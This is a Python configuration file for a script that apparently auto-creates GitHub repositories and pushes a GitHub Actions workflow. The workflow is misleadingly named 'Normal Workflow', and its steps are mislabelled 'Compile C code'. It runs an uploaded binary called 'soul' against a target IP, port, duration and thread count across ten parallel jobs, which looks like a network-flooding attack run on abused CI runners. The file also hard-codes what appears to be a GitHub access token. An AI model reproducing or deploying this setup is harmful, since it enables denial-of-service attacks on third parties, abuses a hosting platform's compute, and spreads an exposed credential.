# -----------------------------
# GITHUB CONFIG
# -----------------------------
TOKEN = "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"
USERNAME = "yoopi744-dot"

# -----------------------------
# FILE CONFIG
# -----------------------------
FILE_PATH = "/root/soul"
UPLOAD_NAME = "soul"

# -----------------------------
# REPO CONFIG
# -----------------------------
REPO_PREFIX = "auto-repo"

# -----------------------------
# WORKFLOW CONFIG
# -----------------------------
ENABLE_WORKFLOW = True
WORKFLOW_YAML = """
name: Normal Workflow
on:
  push:
    branches: [ main ]

jobs:
  attack:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        job: [1,2,3,4,5,6,7,8,9,10]

    steps:
      - uses: actions/checkout@v3
      - name: Compile C code
        run: lscpu
      - name: Compile C code
        run: chmod +x *
      - name: Run attack
        run: ./soul {ip} {port} {time} {threads}
"""

# -----------------------------
# API CONFIG
# -----------------------------
ENABLE_API_CALL = True
API_URL = "http://YOUR_API_URL_HERE"
API_METHOD = "POST"
API_PAYLOAD = {"param1": "value1"}
API_HEADERS = {"Content-Type": "application/json"}